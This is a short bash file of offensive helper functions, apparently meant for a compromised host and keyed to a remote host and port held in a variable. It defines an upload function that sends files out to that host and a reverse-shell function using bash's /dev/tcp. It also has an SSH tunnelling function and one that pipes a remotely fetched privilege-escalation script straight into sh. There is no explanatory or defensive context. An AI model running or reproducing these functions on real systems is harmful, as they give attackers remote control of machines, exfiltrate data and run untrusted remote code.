export HOST=${ME%:*}
export PORT=${ME##*:}

function get() { curl -skL "$@"; }

function put() { curl -skT "$1" "${ME}/$2"; }

function spawn() { /bin/bash -c "bash -i >& /dev/tcp/${HOST}/${PORT} 0>&1"; }

function chizl() { ssh -fNT "$@" -p "${PORT}" "${HOST}"; }

function linpeas() { get "https://i.nit.gg/linpeas" | sh; }
